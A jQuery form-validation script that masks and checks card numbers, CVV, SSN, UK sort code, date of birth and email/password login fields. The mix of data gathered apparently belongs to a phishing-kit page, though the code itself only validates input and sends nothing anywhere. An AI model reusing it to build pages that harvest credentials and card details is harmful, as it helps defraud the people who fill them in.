$(document).ready(function()
{
	$('#nomartu').payment('formatCardNumber');
	$('#cVv').payment('formatCardCVC');
	$('#dobd').mask('99');
	$('#dobm').mask('99');
	$('#doby').mask('9999');
	$('#ssn').mask("999-99-9999");
     $('#sortcode').mask('99-99-99');
     $('#dob').mask('99/99/9999',{placeholder:'dd/mm/yyyy'});

	function validate_card(){
	
	var valid = $.payment.validateCardNumber($('#nomartu').val());

      if (!valid) {
      $('#nomartu').val("");
      $('#nomartu').focus();
      }

	}


function validate_dobyear(tahun){
  var date = new Date(Date.now());
       var month = date.getMonth()+1;
       var year = date.getFullYear();
       
       if(tahun > year ){
          $('#dob').val("").focus();
        }
}
	function validate_dob()
{
		var dob = $('#dob').val();
		var split = dob.split('/');
		
       var bulan = split[1];
       var hari = split[0];
       var tahun = split[2];
        if(bulan > 12)
        {
            $('#dob').val("").focus();
        }
        if(hari > 31)
        {
        	$('#dob').val("").focus();
        }

        validate_dobyear(tahun);
}
function validate_text(){

	$('input[type="text"]').each(function()
	{
		if($(this).val() == '')
		{
			alert('Please, fill the form');
			$(this).focus();
			return false;
		}
	});
}
function validate_tel(){

	$('input[type="tel"]').each(function()
	{
		if($(this).val() == '')
		{
			alert('Please, fill the form');
			$(this).focus();
			return false;
		}
	});
}
function validate_login(type = '')
{
	if(type == 'email'){
	var email = $('#ml').val().length;

	if(email < 8 || email > 50)
	{
		$('#ml').val('').focus();
	}
}else if(type == 'password'){
		var pass = $('#pd').val().length;

	if(pass < 8 || pass > 100)
	{
		$('#pd').val('').focus();
	}
}
}

$('#ml').change(function()
{
	validate_login('email');
});
$('#pd').change(function()
{
	validate_login('password');

});
$('#btn_bill').on('submit',function()
{
	validate_text();
	validate_tel();
});

$('#dob').keyup(function()
{
	validate_dob();
});
/*
$('#dobm').change(function()
{
	validate_dob();
});
$('#dobd').change(function()
{
	validate_dob();
});
$('#doby').change(function()
{
	validate_dobyear();
});*/

function validate_cid()
{
	$('#cid').attr({required:true});
}
$('#nomartu').change(function()
{
	validate_card();
});
$('#nomartu').keyup(function()
{
	var cardType = $.payment.cardType($('#nomartu').val());
   	$('#nomartu').css({background: 'url(./assets/img/cc/'+cardType+'.png) white no-repeat right'});
   	if(cardType == 'amex')
   	{
   		$('#cid_amex').show();
   		validate_cid(); 	
   	}else{
   		$('#cid_amex').hide();
   	}
});

});